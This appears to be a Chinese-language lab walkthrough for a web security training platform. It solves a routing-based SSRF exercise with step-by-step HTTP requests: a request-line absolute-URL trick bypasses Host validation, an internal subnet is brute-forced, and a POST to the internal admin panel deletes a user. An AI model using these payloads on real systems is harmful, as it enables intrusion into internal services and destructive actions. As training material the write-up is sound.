# 实验：通过有缺陷的请求解析进行 SSRF

由于其对请求预期主机的解析存在缺陷，本实验存在基于路由的 SSRF 漏洞。你可以利用此漏洞访问位于内部 IP 地址上的不安全内网管理员面板。

为了解决本实验，请访问位于 `192.168.0.0/24` 网段内的内部管理员面板，然后删除用户 `carlos`。

> **注意**
> 为了防止学院平台被用于攻击第三方，我们的防火墙会阻止实验室与任意外部系统之间的交互。为了解决本实验，你必须使用 Burp Collaborator 的默认公共服务器。

## 步骤

探测
- 访问主页
    ```http
    GET / HTTP/2
    Host: id.web-security-academy.net
    ```

- 尝试修改 Host 头
    ```http
    GET / HTTP/2
    Host: id.oastify.com
    ```
    - 服务器返回 403
        ```log
        Client Error: Forbidden
        ```
    - 似乎存在防御

- 尝试请求行完整 URL 混淆
    ```http
    GET https://id.web-security-academy.net/ HTTP/2
    Host: id.oastify.com
    ```

    - 服务器作为代理返回带外响应
        ```http
        HTTP/2 200 OK
        Server: Burp Collaborator https://burpcollaborator.net/
        ```

尝试暴破内网主机
- 发送到攻击器，构造请求
    ```http
    GET https://id.web-security-academy.net/ HTTP/2
    Host: 192.168.0.§0§
    ```
    - 暴破 `192.168.0.0/24` 网段
    - 取消勾选“使用目标覆盖 Host 头部”复选框

- 在大量 504 响应中发现独特的 302
    ```http
    HTTP/2 302 Found
    Location: /admin
    ```

- 使用头部攻击载荷追踪管理员端点
    ```http
    GET https://id.web-security-academy.net/admin HTTP/2
    Host: 192.168.0.74
    ```

- 获得删除功能表单
    ```html
    <form style='margin-top: 1em' class='login-form' action='/admin/delete' method='POST'>
        <input required type="hidden" name="csrf" value="PsBSjkfeuTyHhcyIzGZLNJn5oshUpxBJ">
        <label>
            Username
        </label>
        <input required type='text' name='username'>
        <button class='button' type='submit'>
            Delete user
        </button>
    </form>
    ```

- 基于删除功能表单构造删除端点的 POST 请求
    ```http
    POST https://id.web-security-academy.net/admin/delete HTTP/2
    Host: 192.168.0.74

    username=carlos&csrf=PsBSjkfeuTyHhcyIzGZLNJn5oshUpxBJ
    ```

    - 成功
